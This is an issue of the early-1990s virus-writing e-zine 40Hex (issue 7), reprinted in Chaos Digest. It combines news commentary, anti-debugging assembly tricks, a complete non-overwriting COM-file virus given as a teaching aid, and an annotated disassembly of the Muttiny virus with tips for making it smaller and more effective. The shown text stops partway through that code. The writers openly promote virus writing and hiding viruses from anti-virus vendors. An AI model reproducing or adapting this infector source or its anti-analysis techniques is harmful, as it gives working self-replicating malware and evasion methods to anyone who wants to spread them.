    Welcome to 40Hex issue 7!  As you may have noticed, we are a little
late in releasing this issue.  This is mainly because very little has
gone on for us to write about.  Enough of the excuses, on with the show.
We are going to start by giving you a little news update on what we've
been up to.

    First of all, Hellraiser is back in New York.  He moved back towards
the end of May.  Once he gets settled and I give him his computer, I am
sure he will be back writing more virii, and possibly editing 40Hex (not
sure if he wants the task of editing 40Hex).  Anyways, to say the
least, its great having him back where he belongs.

    Second, we have several new virii out, these will NOT appear on
Virus BBSs.  Not even ours.  The reason is simple.  Anti-Virus people
are not in the dark anymore.  They are on Virus BBSs.  Since we want our
virii to remain as undetectable as possible, giving them to the general
public is just no longer an option.  Nonetheless, the new virii will be
sure to surprise everyone.

    Third, LandFill BBS is back online.  The number won't be given out
in the mag, I don't want it getting posted on FidoNet.  I am silly that
way.  The other reason I am not putting the number in it is because I
don't want 100+ lamers reading it, and giving the BBS a call.
    Fourth, a new installment of Dark Angel's Virus Writing Guide came
out, get it, it is chunky.

    Finally, greetings to three new members, Black Mischief (Hacker), and
iNVALiD MEDiA (Hacker, SysOp Of Unphamiliar Territories, which is now
invite only!), and Stingray (Ex-VIPER).


                       Table Of Contents

     40Hex-7.000................You've Just Read it
     40Hex-7.001................Virii in the News Part I
     40Hex-7.002................Code Concealment [2]
     40Hex-7.003................An Introduction to Non-overwriting Virii
     40Hex-7.004................Enough Tinys to Sink a Ship
     40Hex-7.005................MtE News Stories
     40Hex-7.006................Virus Spotlite:Dissassembly of Leap Frog
     40Hex-7.007................Spammies Reminder
     40Hex-7.008................Virii in the News Part II
     40Hex-7.009................Debug Script for Pogue Mahone


    Greets to: [NuKE], VIPER, All of the Spammies Entries,
               All -=PHALCON/SKISM=- Members, Dark Avenger
               and anyone else that keeps the virus scene
               going strong.

                                        ->GHeap!

+++++

40Hex Number 7 Volume 2 Issue 3                                    File 001

    WISHFUL THINKING WILL NOT MAKE PUBLICITY-SEEKING VIRUSES GO AWAY

[Hmmmm, a publicity seeking virus.  I had a virus like that.  It
infected my computer and called every news agency telling them what it
had done.]

                 By: Paul Melka for Infoworld 4/27

    We have all heaved a collective sigh since March 6 came and went
with little computer damage from the Michelangelo Virus.  But this sense
of relief obscures what I believe is a very important fact: Michelangelo
was a turning point in the industry, as much as Microsoft's Windows 3.0
was.

    Prior to March 6, the trigger date for the virus, many people hours
were spent in organizations large and small trying to prepare for
attack. [Gimme a break.  An 'attack'.] And when all said and done,
PCs in the United States fared pretty well.  Still everyone's memory of
the Michelangleo virus has begun to fade, and the press - which
thoroughly covered the looming threat - is now focused on how little
damage was done or how much money virus-protection vendors made.

    That frustrates me.  It misses a subtle yet more important aspect of
viruses:  With all the publicity that Michelangelo generated, it was
the forerunner of more powerful and more destructive viruses.

    The publicity from Michelangelo threw down the gauntlet to virus
writers to create newer and more destructive viruses.  Gone are the days
when letters simply fall to the bottom of your screen or you get
prompted by messages asking for cookies or birthday greetings.  The
industry is just beginning to see the emergence of polymorphic viruses
that change their signatures with each infection.(Already a working
version of the self-mutating engine that creates polymorphic viruses is
available on some bulletin boards, along with manuals.)  And we are
beginning to see viruses that are specifically designed to foil various
detection applications.  Finally there are shrink-wrapped applications
infected with viruses; now there is no "safe" way to purchase software.

    The virus software authors also have an advantage over all antivirus
authors in that they can see exactly what they are going against, while
the antivirus developers still have to react to new, unknown viruses.

    What types of viruses are next?  I don't know, and probably most of
the experts don't know either.  But you can certainly speculate on the
various directions that could be taken in the very near future.  We have
already seen the evolution from file infecting viruses, boot sector
viruses, and stealth viruses to polymorphic viruses.

    The increase in the number and occurences of viruses is real.
Products less then a year old that search for "over 300 viruses" are
almost laughed at today, as security specialists cite documentation of
more than 1,000 different strains of viruses.  The National Computer
Security Association estimates that by the end of 1994, there will be
almost 40,000 different virus strains. [A shame they will mostly be
Tiny variants and Jerusalem Hacks]

    With that kind of explosion, new protection methods will be needed.
Most of today's scanners would spent more time scanning each file for
viruses  than there are working hours in a day.  We will see better and
more efficient methods of detecting and preventing viruses that still
allow full use of the computer.

    As a security analyst for a large utility company, I try to keep
everyone educated on the dangers of viruses and how best to avoid them.
I also try to keep myself and the company as up to date as possible on
what is happening with viruses.  But unless everyone realizes that
viruses are real and takes reasonable action against them, there will
come a time when a new "super virus" that cannot be detected by any of
the existing packages is developed. [Wonder who is gonna write that one?]
It will literally cripple some major corporations, while destroying other
businesses completely.

    I don't advise going back to paper and pencil, but I do think that
all PC users have to be vigilant about the threat of viruses, to educate
themselves on the prevention of viruses, and to institute "safe"
practices, including backing up data and using virus-protection
software.

The official patented 40-Hex rebuttal:

    Paul Melka seems to be fairly accurate.  However, there are some
things I feel are wrong.  For example the estimation that there will
be 40,000 virus strains by the end of 1994.  Let's just say for example
that it is about 2 years away.  That would mean that there would be 53
viruses written a day, or 2.2 viruses written an hour!  Jeez, we all
have a shitload of work to do.  Do you find this hard to believe?  I do.
Of course, the way the virus scene is heading, we are becoming like the
warez scene.  All the half-assed fools spreading stuff to other BBSs, not
even seeing what they are, or if they are real.  Ahh well, enough of my
complaints.

    When Mr. Melka mentioned that there was no "safe" way of purchasing
software, it got me thinking.  He is definately correct.  Of course, I feel
that it is the responsibility of all software publishers to check their
disks before packaging them.

    At first, he seemed to be very neutral, but as the article
progressed, I noticed that even Mr. Melka seemed to fall down the
endless pit of ignorance, and resorted to a scare tactic: a virus that
nothing can detect or kill.  He started off saying that he was
speculating, but when he said "...there WILL come a time when a new 'super
virus' that cannot be detected by any of the existing packages is
developed.  It will literally cripple some major corporations, while
destroying other businesses completely."  he said WILL.  It bothers me
that a member of the computer security community would be so close-
minded.

    We are not trying to justify the writing of virii, mainly because we
don't have to.  It isn't illegal.  Making it illegal can't be done; it
takes away our rights.  Of course, we want to distinguish that we don't
spread our virii to anyone who doesn't know that they are virii.  It is
what they do from there that may be against the law.


    If you think it stopped here, here is a letter to the editor of
Infoworld about the above article:


    Both Steve Gibson and Peer-to-Peer columnist Paul Melka have hit on
the reason for the current explosion of viruses.  The key is in the title
to Mr. Melka's column: "Publicity-Seeking."

    Virus writers have the same mentality as chain mail writers: They
like to see how far their viruses spread and they track the spread of
their virus by its nickname.  The glory from this spread would be
greatly diminished if viruses were referred to by mundane serial numbers
like 7B386621C rather than captivating nicknames like Michelangelo.

    I would like to lead a campaign [The Anti Virus Crusades!  Ha!  I
love it!] on two fronts:

    First:  Establish a no-nickname rule.  The National Computer
Security Association and other groups should start referring to viruses
with nondescriptive serial numbers rather than glamorous nicknames.

    Second:  Ask other readers to write representatives and demand
legislation that would impose suitable penalties for malicious computer
crimes.  These penalties would include jail terms. [GULP!]

    In closing, I believe that this is a perfect opportunity for BIOS
manufacturers to sell BIOS upgrades.  Mr. Gibson's observation that the
best defense mechanism for existing viruses lies in the ROM BIOS is
absolutely correct.  Seventy-four percent of virus infections could be
eliminated by a simple BIOS change.  I am part of a support center for
more than 5,000 PCs; I have yet to detect a virus on those few PCs that
boot only from the hard drive.

                                               Marvin Bullock [Buttock?]
                                                Nashville, TN


Rebuttal part ][
----------------

    Ok, this guy I don't really respect.  The no-nickname rule.  W0W!
What a concept.  Because you take the name away from my program, I won't
recognize when some one posts "Oh yeah, The virus 7XZ23576B upon
activation a siren is heard as a ambulance is displayed across the
screen."   We'd never pick up on that.  I also want to know where he got
the 74% figure.  It may be true, but it wasn't documented.  I am not
going to argue the anti-virus issue, as I can only speculate.
Basically, it takes a twit to catch a virus.  Watch what is put on your
system.  If you are a system administrator, don't allow standard write
access to the network drives.  If you do, expect a message like "Your
computer is stoned".  In reality, YOU should be.

PS:Gibson's article refered to the Dark Avenger's MtE, worthwhile if
you don't know about it, otherwise, it is pointless.

                                        ->GHeap

+++++

40Hex Number 7 Volume 2 Issue 3                                   File 002


              % Code Concealment             %
              %    -Demogorgon/PHALCON/SKISM %

     In the previous issue of 40hex, I wrote about how a programmer can
keep his code from being stolen by others.  Ways of doing this are
endless, and I will talk about a few more methods in this installment.

Part I  : Fun with int3
Part II : Fun with int8
Part III: The Prefetch


Part_I : Fun with int3

     Int three is the debugger breakpoint.  Every time a debugger breaks
while tracing through a chunk of code, it will call int3.  Int3 is
called after every instruction is executed in trace mode, and after
a breakpoint is reached.  Note that protected mode debuggers do not
execute int3 in trace mode, but they will break when int3 is called from
your code.  You can use this to your advantage.  Simply install a new
handler for int3 and it will execute instead of the debugger if a thief
tries to trace through your program.

start:  mov     ax, 2503h
        mov     dx, offset int_start
        int     21h                     ;put in the new handler at ds:dx

        ...             ;rest of real code here
        int     20h

text db 'Smoke Mah Ass!$'
int_start:
        mov     ah, 9
        mov     dx, offset text
        int     21h
        int     20h

     As soon as the first int21 call in this program is made, the code
at int_start will execute if it is being traced in a debugger.
Otherwise, the int call will be ignored and your normal code will
execute.  The program can do whatever you want if a debugger is found.
For example, you can format the hard drive or display a message.  The
possabilities are endless.  By the way, it might be wise to restore the
old interrupt handler before you exit the program, because it is bad
programming practice to leave interrupts pointed into non-allocated
memory.


compatability:(works against all debuggers marked with an X)
-------------------------------------------------------------------------
Debug           Turbo Debug             Turbo Debug 386         Soft-Ice
  X                   X
-------------------------------------------------------------------------


Part_II: Fun with int8

     The next segment will show you how to make a program nearly
impossable to trace.  The concept is simple.  All you need to do is
place the main body ofyour program into an int8 handler.  Int8 is the
timer interrupt, and it is called 18.2 times a second.  Debuggers do not
execute int8, so whatever you put there will only go when it is run from
dos.  The only drawback to this is a short delay before the main program
is executed.  It will probably go unnoticed, in most cases.  Here is
some code:

thyroid:mov     ax, 3508h
        int     21h                        ;get int8 handler
        mov     word ptr [int_store], bx   ;store it
        mov     word ptr [int_store+2], es
        mov     dx, offset prog_start
        mov     ah, 25h
        int     21h                        ;install new int8 handler

yip:    cmp     flaag, 1
        jne     yip             ;wait for int8 to be called
                        ;int8 must set the flaag to 1
        push    bx
        pop     dx      ;restore
        push    es      ;old
        pop     ds      ;int8
        int     21h     ;handler
        int     20h

flaag db 0
int_store dd ?
prog_start:
_main_program proc far
        ;save all the necessary registers here
        ;... your code
        mov     flaag, 1
        ;restore the registers

        jmp dword ptr [offset int_store]  ;chain to real int8 handler
_main_program endp

     This code is quite useful in that if some guy tries to trace
through it, he will be stuck forever in the 'yip' loop.  The main code
will never be executed.  If he tries to get out of the loop by
'executing to' the next instruction, he will end up running the entire
program.  No debugger I know of can trace through this, because int8 is
not called from within the debugger.

-------------------------------------------------------------------------
Debug           Turbo Debug             Turbo Debug 386         Soft-Ice
  X                   X                         X                   X
-------------------------------------------------------------------------


Part_III: The Prefetch

     My favorite way to confuse debuggers is to mess with the prefetch
queue.  All intel processors have a small queue where the next
instructions to be executed are stored.  In this way, the CPU does not
have to waste clock cycles by fetching the next instruction, except in
the cases of branching instructions such as jmps and calls.  The next
chunk of code makes use of this:

eapple: mov     ah, 9
        mov     word ptr [offset ear_lobe-2], offset sukk_debug
        mov     dx, offset text
ear_lobe:
        int     21h
        int     20h

text    db 'snee!$'
sukk_debug db 0Ah, 0Dh, 09h, 'blow a goat!', 07h, 0Ah, 0Dh, '$'

     All this program does is print out a text string.  If it is run
from dos, it will print out 'snee!'.  If it is traced through by any
debugger, however, it will print 'blow a goat!', and beep the PC speaker
(07h is ctrl-g).  Let me explain how this works.

     When any chunk of code is executed by dos, the first few bytes are
sent into the prefetch queue.  The actual number of bytes depends on the
model of intel chip, and what year it was made in.  My computer is a
386DX-20 (early model), which has a 16 byte prefetch.  Be sure to check
your code on several machines to insure compatability.

     When the second instruction is reached, it places the offset of
sukk_debug into the next instruction.  That is, the next instruction
becomes 'mov dx, offset sukk_debug', rather than 'mov dx, offset text'.
The system memory will be changed, but the prefetch will not, therefore
only a debugger will respond to the new code.  Dos will execute it as if
the instruction had never changed, because the instruction will already
have been loaded into the prefetch.  This theory can be used, with a
little modification, in order to branch to various subroutines, rather
than just printing out different text.  One interesting application of
this is to use the prefetch area to store registers.  This way, a person
debugging your code can not simply nop it out, because it will be
referred to later on.  In fact, you can even put the stack on the
prefetch.  Try to debug through the following fragment, and watch what
happens:

nee:    mov     ax, 4Ch
        mov     dx, offset text
        mov     sp, offset fin_rot
        push    ax
        mov     ah, 9
fin_rot:int     21h
        pop     ax
        int     21h
text:   db      'Duck is proud of her feet.  They can catch things.$'

     If you run it through debug, the entire program will be corrupted
as soon as you move the stack pointer.  This is because the debug code
uses the stack and expects it to be in a safe location.  If you run it
through soft ice, the code will be corrupted as soon as you push ax.
The stack area will be overwritten when int21 is executed, because the
interrupt uses the stack.  However, in this example, the instruction
pointer will already be beyond this area, so the program will execute
normally.

     Remember not to place the stack past any calls, because then the
prefetch would have to be reloaded after the main program was returned
to, and the instructions that were there before will be gone.

-------------------------------------------------------------------------
Debug           Turbo Debug             Turbo Debug 386         Soft-Ice
  X                   X                         X                   X
-------------------------------------------------------------------------

     That about wraps it up for this installment.  I will probably have
some new methods for you the next issue, unless I get bored and decide
to drop the whole idea.  Keep in mind that the best ideas are your own.

         % % % % % % % % % % % % % % % % % % % % % %
        Remember:  Unprotected code is public domain!
         % % % % % % % % % % % % % % % % % % % % % %

[]     If anyone has any questions or comments about my series,   []
 []    or some more suggestions for methods that can be added to   []
  []   it, feel free to drop me a note on Landfill BBS              []

+++++

40Hex Number 7 Volume 2 Issue 3                                       File 003

                  +++++++++++++++++++++++++++++++++++++++
                  An Introduction to Nonoverwriting Virii
                               By Dark Angel
                  +++++++++++++++++++++++++++++++++++++++

It seems that there are quite a few virus writers out there who just sit at
home and churn out hacks of virii.  Yay.  Anybody with a disassembler and
some free time can churn out dozens of undetectable (unscannable) variants
of any given virus in an hour.  Others have not progressed beyond the
overwriting virus, the type of virus with the most limited potential for
spreading.  Still others have never written a virus before and would like
to learn.  This article is designed as a simple introduction to all
interested to the world of nonoverwriting virii.  All that is assumed is a
working knowledge of 80x86 assembly language.

Only the infection of COM files will be treated in this article, since the
infection routine is, I think, easier to understand and certainly easier to
code than that of EXE files.  But do not dispair!  EXE infections will be
covered in the next issue of 40Hex.

COM files are described by IBM and Microsoft as "memory image files."
Basically, when a COM file is run, the file is loaded as is into memory.
No translation or interpretation of any sort takes place.  The following
steps occur when a COM file is run:

  1) A PSP is built.
  2) The file is loaded directly above the PSP.
  3) The program is run starting from the beginning.

The PSP is a 256 byte header storing such vital data as the command line
parametres used to call the program.  The file is located starting at
offset 100h of the segment where the program is loaded.  Due to the 64K
limit on segment length, COM files may only be a maximum of 64K-100h bytes
long, or 65280 bytes.  If you infect a COM file, make sure the final size
is below this amount or the PSP will get corrupted.

Since the beginning of the file is at offset 100h in the segment (this is
the reason for the org 100h at the start of assembly source for com files),
the initial IP is set to 100h.  The key to understanding nonoverwriting COM
virii is to remember that once the program is loaded into memory, it can be
changed at will without affecting the actual file on disk.

The strategy of an overwriting virus is to write the virus to the beginning
of the COM file.  This, of course, utterly annihilates the original program.
This, of course, is lame.  The nonoverwriting virus changes only the first
few bytes and tacks the virus onto the end of the executable.  The new
bytes at the beginning of the file cause the program, once loaded, to jump
to the virus code.  After the virus is done executing, the original first
few bytes are rewritten to the area starting at 100h and a jmp instruction
is executed to that location (100h).  The infected program is none the
worse for the wear and will run without error.

The trick is to find the correct bytes to add to the beginning of the file.
The most common method is to use a JMP instruction followed by a two byte
displacement.  Since these three bytes replace three bytes of the original
program, it is important to save these bytes upon infection.  The JMP is
encoded with a byte of 0e9h and the displacement is simply the old file
length minus three.

To replace the old bytes, simply use code similar to the following:
  mov di, 100h
  mov si, offset saved_bytes
  movsw
  movsb

And to return control to the original program, use the following:
  mov di, 100h
  jmp di

or any equivalent statements.

When writing nonoverwriting virii, it is important to understand that the
variables used in the code will not be in their original locations.  Since
virii are added to the end of the file, you must take the filesize into
account when calculating offsets.  The standard procedure is to use the
short combination of statements:

  call oldtrick
oldtrick:
  pop  bp                           ;bp = current IP
  sub  bp, offset oldtrick          ;subtract from original offset

After these statements have been executed, bp will hold the difference in
the new offsets of the variables from the original.  To account for the
difference, make the following substitutions in the viral code:

  lea dx, [bp+offset variable]
instead of
  mov dx, offset variable

and

  mov dx, word ptr [bp+offset variable]
instead of
  mov dx, word ptr variable

Alternatively, if you want to save a few bytes and are willing to suffer
some headaches, leave out the sub bp, offset oldtrick and calculate all
offsets as per the procedure above EXCEPT you must now also subtract offset
oldtrick from each of the offsets.

The following is a short nonoverwriting virus which will hopefully help in
your understanding of the techniques explained above.  It's sort of cheesy,
since I designed it to be small and easily understandable.  In addition to
being inefficient (in terms of size), it fails to preserve file date/time
and will not infect read-only files.  However, it serves its purpose well
as a teaching aid.

------------------------------

End of Chaos Digest #1.59
************************************

Chaos Digest              Mardi 22 Juin 1993        Volume 1 : Numero 60
                            ISSN 1244-4901

       Editeur: Jean-Bernard Condat (jbcondat@attmail.com)
       Archiviste: Yves-Marie Crabbe
       Co-Redacteurs: Arnaud Bigare, Stephane Briere

TABLE DES MATIERES, #1.60 (22 Juin 1993)
File 1--40H VMag Number 7 Volume 2 Issue 3 #003(2)-005(1) (reprint)

Chaos Digest is a weekly electronic journal/newsletter. Subscriptions are
available at no cost by sending a message to:
                linux-activists-request@niksula.hut.fi
with a mail header or first line containing the following informations:
                    X-Mn-Admin: join CHAOS_DIGEST

The editors may be contacted by voice (+33 1 47874083), fax (+33 1 47877070)
or S-mail at: Jean-Bernard Condat, Chaos Computer Club France [CCCF], B.P.
155, 93404 St-Ouen Cedex, France.  He is a member of the EICAR and EFF (#1299)
groups.

Issues of ChaosD can also be found from the ComNet in Luxembourg BBS (+352)
466893.  Back issues of ChaosD can be found on the Internet as part of the
Computer underground Digest archives. They're accessible using anonymous FTP:

        * kragar.eff.org [192.88.144.4] in /pub/cud/chaos
        * uglymouse.css.itd.umich.edu [141.211.182.53] in /pub/CuD/chaos
        * halcyon.com [192.135.191.2] in /pub/mirror/cud/chaos
        * ftp.cic.net [192.131.22.2] in /e-serials/alphabetic/c/chaos-digest
        * cs.ubc.ca [137.82.8.5] in /mirror3/EFF/cud/chaos
        * ftp.ee.mu.oz.au [128.250.77.2] in /pub/text/CuD/chaos
        * nic.funet.fi [128.214.6.100] in /pub/doc/cud/chaos
        * orchid.csv.warwick.ac.uk [137.205.192.5] in /pub/cud/chaos

CHAOS DIGEST is an open forum dedicated to sharing French information among
computerists and to the presentation and debate of diverse views. ChaosD
material may be reprinted for non-profit as long as the source is cited.
Some authors do copyright their material, and they should be contacted for
reprint permission.  Readers are encouraged to submit reasoned articles in
French, English or German languages relating to computer culture and
telecommunications.  Articles are preferred to short responses.  Please
avoid quoting previous posts unless absolutely necessary.

DISCLAIMER: The views represented herein do not necessarily represent
            the views of the moderators. Chaos Digest contributors
            assume all responsibility for ensuring that articles
            submitted do not violate copyright protections.

----------------------------------------------------------------------

Date: Tue May 11 09:24:40 PDT 1993
From: 0005847161@mcimail.com (American_Eagle_Publication_Inc. )
Subject: File 1--40H VMag Number 7 Volume 2 Issue 3 #003(2)-005(1) (reprint)


--------Tear line----------------------------------------------------------

DumbVirus segment
Assume    CS:DumbVirus
Org 100h                 ; account for PSP

;Dumb Virus - 40Hex demo virus
;Assemble with TASM /m2

Start:  db      0e9h     ; jmp duh
        dw      0

;This is where the virus starts
duh:    call    next
next:   pop     bp                   ; bp holds current location
        sub     bp, offset next      ; calculate net change

;Restore the original first three bytes
        lea     si, [bp+offset stuff]
        mov     di, 100h
;Put 100h on the stack for the retn later
;This will allow for the return to the beginning of the file
        push    di
        movsw
        movsb

;Change DTA from default (otherwise Findfirst/next will destroy
;commandline parametres
        lea     dx, [bp+offset dta]
        call    set_dta

        mov     ah, 4eh           ;Find first
        lea     dx, [bp+masker]   ;search for '*.COM',0
        xor     cx, cx            ;attribute mask - this is unnecessary
tryanother:
        int     21h
        jc      quit              ;Quit on error

;Open file for read/write
;Note: This fails on read-only files
        mov     ax, 3D02h
        lea     dx, [bp+offset dta+30] ;File name is located in DTA
        int     21h
        xchg    ax, bx

;Read in the first three bytes
        mov     ah, 3fh
        lea     dx, [bp+stuff]
        mov     cx, 3
        int     21h

;Check for previous infection
        mov     ax, word ptr [bp+dta+26]       ;ax = filesize
        mov     cx, word ptr [bp+stuff+1]      ;jmp location
        add     cx, eov - duh + 3              ;convert to filesize
        cmp     ax, cx                         ;if same, already infected
        jz      close                          ;so quit out of here

;Calculate the offset of the jmp
        sub     ax, 3                          ;ax = filesize - 3
        mov     word ptr [bp+writebuffer], ax

;Go to the beginning of the file
        xor     al, al
        call    f_ptr

;Write the three bytes
        mov     ah, 40h
        mov     cx, 3
        lea     dx, [bp+e9]
        int     21h

;Go to the end of the file
        mov     al, 2
        call    f_ptr

; And write the rest of the virus
        mov     ah, 40h
        mov     cx, eov - duh
        lea     dx, [bp+duh]
        int     21h

close:
        mov     ah, 3eh
        int     21h

;Try infecting another file
        mov     ah, 4fh                        ;Find next
        jmp     short tryanother

;Restore the DTA and return control to the original program
quit:   mov     dx, 80h                        ;Restore current DTA to
                                               ;the default @ PSP:80h
set_dta:
        mov     ah, 1ah                        ;Set disk transfer address
        int     21h
        retn
f_ptr:  mov     ah, 42h
        xor     cx, cx
        cwd                                    ;equivalent to: xor dx, dx
        int     21h
        retn

masker  db      '*.com',0
;Original three bytes of the infected file
;Currently holds a INT 20h instruction and a null byte
stuff   db      0cdh, 20h, 0
e9      db      0e9h
eov equ $                                      ;End of the virus
;The following variables are stored in the heap space (the area between
;the stack and the code) and are not part of the virus that is written
;to files.
writebuffer dw  ?                              ;Scratch area holding the
                                               ;JMP offset
dta         db 42 dup (?)
DumbVirus    ENDS
             END     Start

---------------------------------------------------------------------------

Do not worry if not everything makes sense to you just yet.  I tried to
keep the example virus as simple as possible, although, admittedly, the
explanations were a bit cryptic.  It should all come to you in time.

For a more complete discussion of nonoverwriting virii, pick up a copy of
each of the first three parts of my virus writing guide (the phunky, the
chunky, and the crunchy), where you may find a thorough tutorial on
nonresident virii suitable for any beginning virus programmer.

+++++

40Hex Number 7 Volume 2 Issue 3                                     File 004

I picked up a file touted as "a very small virus" and decided to figure out
what this virus could be. SCAN86-B turned up nothing, so I had to disassemble
it.  The name was intriguing -- muttiny.  I thought it was a misspelling of
mutiny, but I was terribly wrong.  After a minute, I had infected a carrier
file and decrypted the virus.  It took but one minute more to disassemble and
maybe half an hour to comment.  Argh!  It is yet another TINY strain!

I do not know who the author is, but I had a few comments to make. This
virus, quite frankly, sucks. It is a pitiful excuse for programming. Many,
many improvements can be made.  I have put comments on how this virus could
be made much mo' bettah.  I must tell whoever wrote the virus that TINY is
not so tiny anymore.  The original TINYs were 150 bytes long.  Now look at
it!  It is over twice that size!  I suppose this virus is the "MUTated TINY"
variant, but I'd prefer to call it "Messed Up Totally TINY".  The author MUST
clean up the virus before distributing it to everyone!  One further
improvement would be to make this virus a generic COM infector, which can be
done in well under 200 bytes, with all the "functionality" of the current
version.  Note that this time I did not rewrite it, a la Tiny F 1.1, but
rather merely suggested improvements.  This way, you can easily see the bugs
for yourself and learn from the author's pitfalls.

              Dark Angel of PHALCON/SKISM     4/23/92

P.S. This is a byte-to-byte match of the virus I picked up -- even the
     labels are in their correct offsets.  The file below should match
     the source code of the original carrier file exactly. Assemble w/
     TASM /m2.

P.P.S. This is the last Tiny strain to be published in 40Hex. For some
     Reason, Tiny strains seem to come up again and again over here. I
     think it is hightime to put the Tiny series in its grave where it
     belongs.  Amen.  So be it.                                     DA

muttiny         segment byte public
                assume  cs:muttiny, ds:muttiny

                org     100h

start:          db      0e9h, 5, 0              ;jmp     startvir
restorehere:    int     20h
idword:         dw      990h
;The next line is incredibly pointless. It is a holdover from one
;of the original TINYs, where the id was 7, 8, 9.  The author can
;easily save one byte merely by deleting this line.
                db      09h
startvir:
                call    oldtrick                ;Standard location-finder
oldtrick:       pop     si
;The following statement is a bug -- well, not really a bug, just
;extraneous code.  The value pushed on the stack in the following
;line is NEVER popped off. This is messy programming, as one byte
;could be saved by removing the statement.
                push    si
                sub     si,offset oldtrick
                call    encrypt                 ;Decrypt virus
                call    savepsp                 ;and save the PSP
;NOTE:  The entire savepsp/restorepsp procedures are unnecessary.
        See the procedures at the end for further details.
                jmp     short findencryptval    ;Go to th rest of the virus
;The next line is another example of messy programming -- it is a
;NOP inserted by MASM during assembly.  Running this file through
;TASM with the /m2 switch should eliminate such "fix-ups."
                nop
;The next line leaves me guessing as to the author's true intent.
                db      0

encryptval      dw      0h

encrypt:
                push    bx                      ;Save handle
;The following two lines of code could be condensed into one:
;      lea bx, [si+offset startencrypt]
;Once again, poor programming style, though there's nothing wrong
;with the code.
                mov     bx,offset startencrypt
                add     bx,si
;Continueencrypt is implemented as a jmp-type loop. Although it's
;fine to code it this way, it's probably easier to code using the
;loop statement.  Upon close inspection, one finds the loop to be
;flawed. Note the single inc bx statement. This essentially makes
;the encryption value a a byte instead of a word, which decreases
;the number of mutations from 65,535 to 255.  Once again, this is
;just poor programming, very easily rectified with another inc bx
;statement. Another optimization could be made.  Use a
;      mov dx, [si+encryptval]
;to load up the encryption value before the loop, and replace the
;three lines following continueencrypt with a simple:
;      xor word ptr [bx], dx
continueencrypt:
                mov     ax,[bx]
                xor     ax,word ptr [si+encryptval]
                mov     [bx],ax
                inc     bx
;The next two lines should be executed BEFORE continueencrypt. As
;it stands right now, they are recalculated every iteration which
;slows down execution somewhat. Furthermore, the value calculated
;is much too large and this increases execution time. Yet another
;improvement would be the merging of the mov/add pair to the much
;cleaner lea cx, [si+offset endvirus].
                mov     cx,offset veryend       ;Calculate end of
                add     cx,si                   ;encryption: Note
                cmp     bx,cx                   ;the value is 246
                jle     continueencrypt         ;bytes too large.
                pop     bx
                ret
writerest:                                      ;Tack on the virus to the
                call    encrypt                 ;end of the file.
                mov     ah,40h
                mov     cx,offset endvirus - offset idword
                lea     dx,[si+offset idword]   ;Write starting from the id
                int     21h                     ;word
                call    encrypt
                ret

startencrypt:
;This is where the encrypted area begins.  This could be moved to
;where the ret is in procedure writerest, but it is not necessary
;since it won't affect the "scannability" of the virus.

findencryptval:
                mov     ah,2Ch                  ;Get random #
                int     21h                     ;CX=hr/min dx=sec
;The following chunk of code puzzles me. I admit it, I am totally
;lost as to its purpose.
                cmp     word ptr [si+offset encryptval],0
                je      step_two
                cmp     word ptr [si+offset encryptval+1],0
                je      step_two
                cmp     dh,0Fh
                jle     foundencryptionvalue
step_two:                                       ;Check to see if any
                cmp     dl,0                    ;part of the encryption
                je      findencryptval          ;value is 0 and if so,
                cmp     dh,0                    ;find another value.
                je      findencryptval
                mov     [si+offset encryptval],dx
foundencryptionvalue:
                mov     bp,[si+offset oldjmp]   ;Set up bp for
                add     bp,103h                 ;jmp later
                lea     dx,[si+filemask]        ;'*.COM',0
                xor     cx,cx                   ;Attributes
                mov     ah,4Eh                  ;Find first
tryanother:
                int     21h
                jc      quit_virus              ;If none found, exit

                mov     ax,3D02h                ;Open read/write
                mov     dx,9Eh                  ;In default DTA
                int     21h

                mov     cx,3
                mov     bx,ax                   ;Swap file handle register
                lea     dx,[si+offset buffer]
                mov     di,dx
                call    read                    ;Read 3 bytes
                cmp     byte ptr [di],0E9h      ;Is it a jmp?
                je      infect
findnext:
                mov     ah,4Fh                  ;If not, find next
                jmp     short tryanother
infect:
                mov     ax,4200h                ;Move file pointer
                mov     dx,[di+1]               ;to jmp location
                mov     [si+offset oldjmp],dx   ;and save old jmp
                xor     cx,cx                   ;location
                call    int21h
                jmp     short skipcheckinf
;Once again, we meet an infamous MASM-NOP.
                nop
;I don't understand why checkinf is implemented as a procedure as
;it is executed but once.  It is a waste of code space to do such
;a thing. The ret and call are both extra, wasting four bytes. An
;additional three bytes were wasted on the JMP skipping checkinf.
;In a program called "Tiny," a wasted seven bytes is rather large
;and should not exist.  I have written a virus of half the length
;of this virus which is a generic COM infector. There is just too
;too much waste in this program.
checkinf:
                cmp     word ptr [di],990h      ;Is it already
                je      findnext                ;infected?
;The je statement above presents another problem. It leaves stuff
;on the stack from the call.  This is, once again, not a critical
;error but nevertheless it is extremely sloppy behavior.
                xor     dx,dx
                xor     cx,cx
                mov     ax,4202h
                call    int21h                  ;Goto end of file
                ret
skipcheckinf:
                mov     cx,2
                mov     dx,di
                call    read                    ;read 2 bytes
                call    checkinf
;The next check is extraneous.  No COM file is larger than 65,535
;bytes before infection simply because it is "illegal."  Yet ano-
;ther waste of code.  Even if one were to use this useless check,
;it should be implemented, to save space, as or dx, dx.
                cmp     dx,0                    ;Check if too big
                jne     findnext

                cmp     ah,0FEh                 ;Check again if too big
                jae     findnext
                mov     [si+storejmp],ax        ;Save new jmp
                call    writerest               ;    location
                mov     ax,4200h                ;Go to offset
                mov     dx,1                    ;1 in the file
                xor     cx,cx
                call    int21h

                mov     ah,40h                  ;and write the new
                mov     cx,2                    ;jmp location
                lea     dx,[si+storejmp]
                call    int21h
;I think it is quite obvious that the next line is pointless.  It
;is a truly moronic waste of two bytes.
                jc      closefile
closefile:
                mov     ah,3Eh                  ;Close the file
                call    int21h
quit_virus:
                call    restorepsp
                jmp     bp

read:
                mov     ah,3Fh                  ;Read file
;I do not understand why all the int 21h calls are done with this
;procedure.  It is a waste of space. A normal int 21h call is two
;bytes long while it's three bytes just to call this procedure!
int21h:
                int     21h
                ret

                db      'Made in England'

;Note: The comments for savepsp also apply to restorepsp.

;This code could have easily been changed to a set active DTA INT
;21h call (AH = 1Ah).  It would have saved many, many bytes.

savepsp:
                mov     di,0
;The following is a bug.  It should be
;      mov cx, 50h
;since the author decided to use words instead of bytes.
                mov     cx,100h
                push    si
;The loop below is dumb.  A simple rep movsw statement would have
;sufficed.  Instead, countless bytes are wasted on the loop.
storebytes:
                mov     ax,[di]
                mov     word ptr [si+pspstore],ax
                add     si,2
                add     di,2
                loop    storebytes
                pop     si
                ret

restorepsp:
                mov     di,0
                mov     cx,100h                 ;Restore 200h bytes
                push    si
restorebytes:
